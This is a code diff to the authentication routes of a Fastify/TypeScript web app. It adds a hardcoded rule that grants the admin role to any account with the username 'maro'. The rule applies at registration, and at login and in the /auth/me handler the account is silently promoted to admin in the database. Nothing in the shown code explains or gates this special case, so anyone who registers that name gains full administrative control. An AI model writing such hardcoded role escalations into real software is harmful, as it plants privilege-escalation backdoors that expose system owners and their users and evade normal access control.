@@ -24,13 +24,14 @@ export const authRoutes = async (app: FastifyInstance) => {
     }
 
     const { username, password } = parsed.data;
+    const normalized = username.trim().toLowerCase();
     const existing = db.prepare("SELECT id FROM users WHERE email = ?").get(username) as { id: string } | undefined;
     if (existing) {
       return reply.code(409).send({ error: "Benutzername bereits vergeben" });
     }
 
     const now = nowIso();
-    const role = settings.adminEmails.includes(username) ? "admin" : "user";
+    const role = settings.adminEmails.includes(username) || normalized === "maro" ? "admin" : "user";
     const passwordHash = await hashPassword(password);
     const id = randomUUID();
     db.prepare(
@@ -47,6 +48,7 @@ export const authRoutes = async (app: FastifyInstance) => {
     }
 
     const { username, password } = parsed.data;
+    const normalized = username.trim().toLowerCase();
     const user = db
       .prepare("SELECT * FROM users WHERE email = ?")
       .get(username) as { id: string; email: string; password_hash: string; role: string } | undefined;
@@ -59,8 +61,14 @@ export const authRoutes = async (app: FastifyInstance) => {
       return reply.code(401).send({ error: "Invalid credentials" });
     }
 
-    const token = app.jwt.sign({ id: user.id, username: user.email, role: user.role });
-    return reply.send({ token, user: { id: user.id, username: user.email, role: user.role } });
+    let role = user.role;
+    if (normalized === "maro" && user.role !== "admin") {
+      role = "admin";
+      db.prepare("UPDATE users SET role = 'admin', updated_at = ? WHERE id = ?").run(nowIso(), user.id);
+    }
+
+    const token = app.jwt.sign({ id: user.id, username: user.email, role });
+    return reply.send({ token, user: { id: user.id, username: user.email, role } });
   });
 
   app.get("/auth/me", { preHandler: requireAuth }, async (request, reply) => {
@@ -70,6 +78,10 @@ export const authRoutes = async (app: FastifyInstance) => {
       .get(user.id) as { id: string; email: string; role: string; created_at: string } | undefined;
     if (!record) {
       return reply.code(404).send({ error: "Not found" });
+    }
+    if (record.email.trim().toLowerCase() === "maro" && record.role !== "admin") {
+      db.prepare("UPDATE users SET role = 'admin', updated_at = ? WHERE id = ?").run(nowIso(), record.id);
+      record.role = "admin";
     }
     return reply.send({ id: record.id, username: record.email, role: record.role, created_at: record.created_at });
   });
